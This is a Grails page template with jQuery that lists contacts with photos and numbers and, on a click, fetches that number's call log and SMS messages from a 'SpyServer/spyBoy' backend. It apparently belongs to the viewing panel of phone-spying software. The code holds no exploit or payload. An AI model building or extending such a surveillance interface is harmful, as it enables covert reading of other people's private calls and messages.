<g:each in="${contactInstanceList}" status="i" var="contactInstance">
	<li id="contact-${fieldValue(bean: contactInstance, field: "id")}"
		style="height: 163px; padding-bottom: 5px; width: 118px; margin: 0 0 3px 3px;"
		class="notSelected"
		onclick="loadAllAjaxSections('${contactInstance.formatedPhoneNumer}');cSelected(this);">
		
		<%-- <div id="spinner${contactInstance.id}" class="spinner" style="display:block;top:20%"></div> --%>
				
		<div class="happy-clients-photo">
			<img
				src="${createLink(controller:'spyBoy', action:'getImageBytes', params : [picname: contactInstance.formatedPhoneNumer])}"/>
			<%--<img src="${resource(dir: 'images', file: 'happy-clients-01.jpg')}" alt="" />--%>
		</div>
		<div class="happy-clients-cite">
			${fieldValue(bean: contactInstance, field: "formatedPhoneNumer")}
		</div>
		<div class="happy-clients-cite">
			${fieldValue(bean: contactInstance, field: "type")}
		</div>
		<div class="happy-clients-author">
			${fieldValue(bean: contactInstance, field: "name")}
		</div>
	</li>
</g:each>
<script>
	function customSpinner(show,spinnerObjID){
		//debugger;
		if(show){
			jQuery("#" + spinnerObjID ).show();
		}else{
			jQuery("#" + spinnerObjID ).hide();
		}		
	}
	
	function cSelected(obj) {
		jQuery("#contactsAjaxTargetDiv li.selectedContact").removeClass(
				"selectedContact").addClass("notSelected");
		jQuery(obj).removeClass("notSelected").addClass("selectedContact");
	}

	function loadAllAjaxSections(number) {
		jQuery("#callLogNotice").hide();
		jQuery("#callLogSpinner").show();
		jQuery.ajax({
			type : 'POST',
			data : {
				'number' : number
			},
			url : '/SpyServer/spyBoy/callLog',
			success : function(data, textStatus) {
				jQuery('#callLogAjaxTargetDiv').html(data);
				jQuery("#callLogSpinner").hide();
				jQuery("#callLogNotice").show();
			},
			error : function(XMLHttpRequest, textStatus, errorThrown) {
				jQuery("#callLogSpinner").hide();
				jQuery("#callLogNotice").show();
			}
		});
		jQuery("#smsNotice").hide();
		jQuery("#smsSpinner").show();
		jQuery.ajax({
			type : 'POST',
			data : {
				'number' : number
			},
			url : '/SpyServer/spyBoy/sms',
			success : function(data, textStatus) {
				jQuery('#smsAjaxTargetDiv').html(data);
				jQuery("#smsSpinner").hide();
				jQuery("#smsNotice").show();
			},
			error : function(XMLHttpRequest, textStatus, errorThrown) {
				jQuery("#smsSpinner").hide();
				jQuery("#smsNotice").show();
			}
		});
	}
</script>